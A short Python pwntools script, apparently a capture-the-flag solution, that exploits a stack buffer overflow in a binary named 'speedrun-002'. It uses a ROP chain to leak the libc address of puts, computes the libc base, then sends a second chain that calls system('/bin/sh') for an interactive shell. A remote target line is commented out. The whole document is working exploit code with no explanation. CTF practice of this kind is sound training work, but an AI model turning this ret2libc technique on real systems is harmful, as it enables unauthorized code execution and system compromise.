from pwn import *
import time

e = ELF("./speedrun-002")
context.binary = e
rop = ROP(e)
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")

r = process("./speedrun-002")
# r = remote("172.17.0.5", 31337)

r.recv()
r.sendline("Everything intelligent is so boring."+"\x00")
r.recv()

rop.raw("A"*1032)
rop.raw(rop.rdi)
rop.raw(e.got['puts'])
rop.raw(e.plt['puts'])
# rop.raw(rop.rdi)
# rop.raw(e.got['read'])
# rop.raw(e.plt['puts'])
rop.raw(0x400600) # jump to .text -> main() (?)
r.sendline(rop.chain())
r.recvline()
puts = u64(r.recvline().strip() + b"\x00\x00")
# read = u64(r.recvline().strip() + b"\x00\x00")
log.success(f"PUTS: {hex(puts)}")
# log.success(f"READ: {hex(read)}") # libc version = libc6_2.27-3ubuntu1_amd64
libc.address = puts - libc.sym['puts']
r.recv()
r.sendline("Everything intelligent is so boring."+"\x00")
r.recv()

rop = ROP(e)
rop.raw("A"*1032)
rop.raw(rop.rdi)
rop.raw(next(libc.search(b"/bin/sh")))
rop.raw(rop.ret)
rop.raw(libc.sym['system'])
r.sendline(rop.chain())
# need a gadget or something to jump back to after leak so i can get system call
r.interactive()